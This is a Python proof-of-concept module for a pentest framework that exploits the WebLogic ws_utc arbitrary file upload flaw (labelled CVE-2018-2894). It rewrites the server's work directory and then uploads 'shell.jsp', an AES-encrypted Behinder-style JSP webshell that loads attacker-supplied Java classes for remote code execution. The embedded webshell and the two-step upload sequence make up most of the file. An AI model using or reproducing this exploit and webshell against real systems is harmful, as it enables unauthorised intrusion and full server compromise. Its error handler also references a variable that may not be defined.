import pocs
from lib import config
from lib import output
import re
import requests

class POC(pocs.Pocs):

    def __init__(self):
        '''
            初始化函数
        '''
        # 根据漏洞的信息进行定义
        super().__init__()
        self.poc_name='weblgic 任意文件上传漏洞'
        self.vul_name='weblgic 任意文件上传漏洞'
        self.vul_num='CVE-2018—2894'
        self.app_name='weblgic'
        self.app_version='10.3.6 12.1.3 12.2.1'
        self.author='haochen'
        self.output = output.cmd_output()
        self.msg="在知道部署应用到web目录以及ws_utc/config.do存在的情况下可以利用"
        # 根据需要的参数进行定义，被攻击的url或ip必须定义为target
        self.must_parameter={
            'target' : ''
        }

    def exploit(self,must_parameter,cho_parameter):
        '''
            扫描使用的函数
        '''
        # 自由发挥
        att_msg={}
        # 将攻击的目标和poc名称导入
        url = must_parameter['target']
        ip=url.replace('http:','').replace('https:','').replace('/','')
        self.must_parameter = must_parameter
        head = config.Pack
        head1 = {
            'Host': ip,
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:93.0) Gecko/20100101 Firefox/93.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'multipart/form-data;',
            'boundary':'---------------------------3235904419448070938604240789',
            'Content-Length': '1410',
            'Connection': 'close',
            'Cookie': 'JSESSIONID=_frqtfvQQDwgTIcVK2_NyDJKQvLx38sWsB65Ediv9fFWv_vuwRRU!-1652605611',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'iframe',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1'
        }
        data1 = {
            'setting_id':'general',
            'BasicConfigOptions.workDir':'%2Fu01%2Foracle%2Fuser_projects%2Fdomains%2Fbase_domain%2Fservers%2FAdminServer%2Ftmp%2F_WL_internal%2Fcom.oracle.webservices.wls.ws-testclient-app-wls%2F4mcj4y%2Fwar%2Fcss',
            'BasicConfigOptions.proxyHost':'',
            'BasicConfigOptions.proxyPort':'80'
        }
        data2={
            '':'''-----------------------------3235904419448070938604240789
Content-Disposition: form-data; name="ks_name"

1
-----------------------------3235904419448070938604240789
Content-Disposition: form-data; name="ks_edit_mode"

false
-----------------------------3235904419448070938604240789
Content-Disposition: form-data; name="ks_password_front"

1
-----------------------------3235904419448070938604240789
Content-Disposition: form-data; name="ks_password"

1
-----------------------------3235904419448070938604240789
Content-Disposition: form-data; name="ks_password_changed"

true
-----------------------------3235904419448070938604240789
Content-Disposition: form-data; name="ks_filename"; filename="shell.jsp"
Content-Type: application/octet-stream

<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*�ƥ:ޥ�32Mmd5<�M16Mؤޥ�rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
-----------------------------3235904419448070938604240789--'''
        }
        self.payload='/ws_utc/resources/setting/options'
        self.payload2 = '/ws_utc/resources/setting/keystore?timestamp=1636026737832'
        if re.search('/$',url):
            url=url[0:len(url)-1]
        target = url + self.payload
        target2 = url + self.payload2
        try:
            response = requests.post(target,headers=head,data=data1)
            # 攻击完成后需要将攻击的结果写入
            if response.status_code == 200:
                self.output.output_info('修改路径成功！')
                response2 = requests.post(target2,headers=head1,data=data2)
                if response2.status_code == 200:
                    self.output.output_info('木马上上传成功！')
                else:
                    self.output.output_error('木马上传失败！'+str(response2.status_code))
            else:
                self.output.output_error('修改路径失败！'+str(response.status_code))
        except:
            self.output.output_error('访问网站时发生错误！'+str(response2.status_code))
        return att_msg